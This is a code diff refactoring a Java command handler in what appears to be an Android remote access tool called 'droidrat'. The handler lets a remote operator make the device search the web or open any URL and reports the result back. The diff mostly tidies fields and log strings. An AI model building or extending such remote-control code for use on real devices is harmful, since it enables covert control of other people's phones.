@@ -10,11 +10,9 @@ import static com.je_chen.droidrat_je.service.command.ProcessCommandService.webs
 
 public class WebCommand extends CommandFather {
 
-    private final String TAG = "Web Event ";
+    private final Web web;
 
-    private Web web;
-
-    private Context context;
+    private final Context context;
 
     public WebCommand(Context context) {
         this.context = context;
@@ -30,19 +28,20 @@ public class WebCommand extends CommandFather {
     public void processCommand(String command) {
         try {
             String[] rawCommandArray = command.split(" ");
+            String TAG = "Web Event ";
             switch (rawCommandArray[1]) {
                 case "WebSearch":
                     String webUri1 = rawCommandArray[2];
-                    Log.d(TAG, "Web Websearch " + webUri1);
+                    Log.d(TAG, "Web ern search " + webUri1);
                     web.webSearch(context, webUri1);
-                    this.send("Web Websearch" + webUri1);
+                    this.send("Web web search" + webUri1);
                     break;
 
                 case "OpenWeb":
                     String webUri2 = rawCommandArray[2];
-                    Log.d(TAG, "Web Openweb " + webUri2);
+                    Log.d(TAG, "Web open web " + webUri2);
                     web.openWeb(context, webUri2);
-                    this.send("Web Openweb " + webUri2);
+                    this.send("Web open web " + webUri2);
                     break;
             }
         } catch (Exception e) {
